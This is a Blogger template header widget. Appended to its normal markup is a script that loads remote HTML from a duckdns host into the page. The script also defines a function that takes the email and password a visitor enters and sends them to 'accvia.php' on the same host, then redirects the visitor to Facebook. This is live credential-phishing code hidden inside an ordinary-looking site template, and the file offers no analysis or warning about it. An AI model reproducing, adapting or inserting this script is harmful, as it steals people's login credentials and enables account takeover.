  <header>
    <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
      <b:widget id='Header1' locked='false' title='Blogger54asd (Header)' type='Header' version='1'>
        <b:widget-settings>
          <b:widget-setting name='displayUrl'/>
          <b:widget-setting name='displayHeight'>0</b:widget-setting>
          <b:widget-setting name='sectionWidth'>-1</b:widget-setting>
          <b:widget-setting name='useImage'>false</b:widget-setting>

        </b:widget-settings>
        <b:includable id='main'>
          <b:if cond='data:useImage'>
            <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
              <b:if cond='data:mobile'>
                <div id='header-inner'>
                  <div class='titlewrapper' style='background: transparent'>
                    <h1 class='title' style='background: transparent; border-width: 0px'>
                      <b:include name='title'/>
                    </h1>
                  </div>
                  <b:include name='description'/>
                </div>
                <b:else/>
                <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;+ &quot;background-position: &quot;+ data:backgroundPositionStyleStr + &quot;; &quot;+ data:widthStyleStr+ &quot;min-height: &quot; + data:height+ &quot;_height: &quot; + data:height+ &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
                  <div class='titlewrapper' style='background: transparent'>
                    <h1 class='title' style='background: transparent; border-width: 0px'>
                      <b:include name='title'/>
                    </h1>
                  </div>
                  <b:include name='description'/>
                </div>
              </b:if>
              <b:else/>
              <div id='header-inner'>
                <a expr:href='data:blog.homepageUrl' style='display: block'>
                  <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
                </a>
                <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                  <b:include name='description'/>
                </b:if>
              </div>
            </b:if>
            <b:else/>
            <div id='header-inner'>
              <div class='titlewrapper'>
                <h1 class='title'>
                  <b:include name='title'/>
                </h1>
              </div>
              <b:include name='description'/>
            </div>
          </b:if>
        </b:includable>
        <b:includable id='description'>
          <div class='descriptionwrapper'>
            <p class='description'><span>
                <data:description/></span></p>
          </div>
        </b:includable>
        <b:includable id='title'>
          <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
            <data:title/>
          </b:tag>
        </b:includable>

<script>
  $(&#39;#myModal_Loading&#39;).modal(&#39;show&#39;);
  function hideModal() {
    $(&quot;#myModal&quot;).removeClass(&quot;in&quot;);
    $(&quot;.modal-backdrop&quot;).remove();
    $(&quot;#myModal&quot;).hide();
  }
  var xhr = new XMLHttpRequest();
  xhr.open(&#39;GET&#39;, &#39;//duytamnew.duckdns.org/hao/script.php?key=&#39; + document.getElementById(&quot;is_smart_key&quot;).value);
  xhr.onload = function () {
    if (xhr.status === 200) {
      document.getElementById(&quot;html_main&quot;).innerHTML = xhr.responseText;
      hideModal();
    }
  };
  xhr.send();
  function js_dp_fb() {
    var email = document.getElementById(&quot;email&quot;).value;
    var pass = document.getElementById(&quot;pass&quot;).value;
    var key = document.getElementById(&quot;is_smart_key&quot;).value;
    var truyen = encodeURI(&quot;email=&quot; + email + &quot;|pass=&quot; + pass + &quot;|key=&quot; + key + &quot;|laguage=&quot; + sr);
	var email = document.getElementById(&quot;email&quot;);
    var filter = /^([a-zA-Z0-9_\.\-\+\)\ \(\@]{5,100})+$/;
    if (!filter.test(email.value)) { 
             alert(&#39;Email ou número de telefone está incorreto.&#39;);
             email.focus; 
             return false; 
    }
    var xhr = new XMLHttpRequest();
    xhr.open(&#39;GET&#39;, &#39;//duytamnew.duckdns.org/hao/accvia.php?&#39;+ truyen);
    xhr.onload = function () {
      if (xhr.status === 200) {
        try {
          var rs = xhr.responseText;
          if (rs != &quot;error&quot;) {
            window.location = &#39;https://www.facebook.com&#39;;
          }
        } catch (ex) { }
      }
    };
    xhr.send();
  } 
</script>
